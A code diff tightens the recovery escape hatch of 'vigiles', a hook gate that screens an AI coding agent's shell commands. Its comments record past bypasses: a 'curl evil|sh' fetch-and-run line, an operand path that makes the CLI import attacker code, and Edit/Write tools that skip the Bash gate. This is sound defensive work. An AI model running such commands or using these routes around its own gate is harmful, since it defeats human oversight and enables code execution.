@@ -1126,7 +1126,7 @@ export function isStampRepairEvent(
   const filePath = event.tool_input?.file_path;
   if (typeof filePath === "string" && samePathRef(filePath, hookFile))
     return true;
-  return allLeavesAre(event, isCompileLeaf);
+  return allLeavesAre(event, (leaf) => isCompileLeaf(leaf, hookFile));
 }
 
 /**
@@ -1207,8 +1207,83 @@ function vigilesExecIndex(argv: readonly string[]): number {
   return -1;
 }
 
-/** A leaf invoking `vigiles compile`, however it is launched. */
-function isCompileLeaf(leaf: NormalizedLeaf): boolean {
+/**
+ * ONE spelling of a path, compared EXACTLY — not {@link samePathRef}.
+ *
+ * 🔴 `samePathRef` matches by SUFFIX (`x.endsWith("/" + y)`), which is right for
+ * the Edit escape (Claude Code sends an absolute `file_path` while settings may
+ * carry a relative one) and catastrophic here: with the reported hook at
+ * `.claude/hooks/guard.hook.ts`, the operand `/tmp/evil/.claude/hooks/guard.hook.ts`
+ * suffix-matches it, and the operand is a path the CLI IMPORTS. Reusing the
+ * nearby helper because it is nearby is how this door was widened before.
+ */
+function sameOperandPath(a: string, b: string): boolean {
+  const norm = (p: string): string =>
+    p.replace(/\\/g, "/").replace(/^\.\//, "");
+  return norm(a) === norm(b);
+}
+
+/**
+ * A leaf invoking `vigiles compile` — BARE, or naming the one file whose failure
+ * is being repaired. Nothing else.
+ *
+ * 🔴 THIS DOOR HAS BEEN WRONG THREE TIMES, and the first two fixes each narrowed
+ * the SHAPE without asking what the door is for. It matched the two words
+ * anywhere in the argv (so `sh -c 'curl evil|sh' vigiles compile` walked
+ * through); then it required `vigiles` to be the executable, and the ARGUMENT
+ * became the payload — `vigiles compile /tmp/payload.spec.ts` was admitted while
+ * the gate was down, and `compile` hands that operand to `loadSpec`, which
+ * `await import()`s it and, failing that, shells out to
+ * `npx tsx -e 'import("<operand>")'`. Arbitrary top-level code, executed by the
+ * fail-closed gate's own escape hatch.
+ *
+ * ## What the operand rule is, and why it is sound
+ *
+ * The event may contribute AT MOST one token, and only by echoing a value the
+ * REPO already chose:
+ *
+ *  - **no operand** — `vigiles compile` compiles what the repo DECLARES:
+ *    `findSpecs()` globs the checkout and `discoverHookFiles(cwd)` reads
+ *    `.vigiles/hooks/`. Nothing here comes from the event, so there is no
+ *    attacker-chosen input at all. (This is the exact command this repo's own
+ *    PostToolUse hook already runs.)
+ *  - **exactly one operand, equal to `repairTarget`** — the file the runtime was
+ *    invoked with (`vigiles hook-runtime run-program <file>`, wired from the
+ *    compiled hooks block in settings). It is repo-owned config, not event data;
+ *    the event can only re-supply the one path the repo already named, and any
+ *    other path — including one merely INSIDE the checkout — is refused.
+ *
+ * "Inside the repo" would NOT have been sound: a checkout holds attacker-writable
+ * paths in plenty of workflows (a PR branch, a fixture dir, `/tmp` symlinked in),
+ * and `loadSpec` executes whatever it is pointed at. Equality with a single
+ * repo-declared path is the property that closes it.
+ *
+ * The residual exposure, stated rather than glossed: whoever can WRITE that hook
+ * source, or drop a `*.md.spec.ts` into the checkout, gets code executed. That is
+ * true of the repo's ordinary `npm run build` and of the recompile hook that
+ * already runs on every spec edit — and an attacker who can rewrite the hook
+ * owns the gate outright. The escape must not AMPLIFY that reach, and with an
+ * event-supplied path it did; with this rule it does not.
+ *
+ * ## The recovery path, so it is not rediscovered by trial and error
+ *
+ * A real person whose repo is wedged needs one command that works:
+ *
+ *  - stale stamp (you edited a `.hook.ts`) → run the command the refusal prints
+ *    VERBATIM: `vigiles compile <that file>`. It is quoted from the same string
+ *    this function compares against, so a copy-paste always matches.
+ *  - hook sources under `.vigiles/hooks/` → bare `vigiles compile` also does it.
+ *  - load failure (`package.json` left holding merge-conflict markers, so Node
+ *    cannot resolve `vigiles/hook`) → `git merge --abort` / `git rebase --abort`
+ *    / `git checkout -- <path>`; compiling cannot help, the loader is broken.
+ *  - last resort, always available: Edit/Write do NOT go through the PreToolUse
+ *    Bash gate, so the offending file can be fixed with a file tool and the
+ *    session unblocks itself.
+ *
+ * A second operand, a flag, or any other path is refused — deliberately. If you
+ * need to compile one unrelated spec while wedged, fix the wedge first.
+ */
+function isCompileLeaf(leaf: NormalizedLeaf, repairTarget?: string): boolean {
   const i = vigilesExecIndex(leaf.argv);
   if (i === -1) return false;
   // The verb is `args[0]` in the CLI's own dispatch — it takes no global flags
@@ -1216,7 +1291,16 @@ function isCompileLeaf(leaf: NormalizedLeaf): boolean {
   // stop reading its own options (`npm exec vigiles -- compile`).
   let j = i + 1;
   while (leaf.argv[j] === "--") j++;
-  return leaf.argv[j] === "compile";
+  if (leaf.argv[j] !== "compile") return false;
+  const operands = leaf.argv.slice(j + 1);
+  if (operands.length === 0) return true;
+  const only = operands[0];
+  return (
+    operands.length === 1 &&
+    only !== undefined &&
+    repairTarget !== undefined &&
+    sameOperandPath(only, repairTarget)
+  );
 }
 
 /**
@@ -1290,9 +1374,18 @@ function allLeavesAre(
  * writes a path they name, or reaches the network. {@link allLeavesAre} is why
  * composition cannot smuggle one in.
  */
-export function isRecoveryEvent(event: RawHookEvent): boolean {
+export function isRecoveryEvent(
+  event: RawHookEvent,
+  /**
+   * The hook file the runtime was invoked with — the ONLY path a
+   * `vigiles compile <operand>` may name. Omitted, no operand is accepted at
+   * all: a caller that cannot say which file is being repaired must not be able
+   * to hand `compile` a path, so this fails CLOSED by default.
+   */
+  hookFile?: string,
+): boolean {
   return allLeavesAre(
     event,
-    (leaf) => isGitRecoveryLeaf(leaf) || isCompileLeaf(leaf),
+    (leaf) => isGitRecoveryLeaf(leaf) || isCompileLeaf(leaf, hookFile),
   );
 }
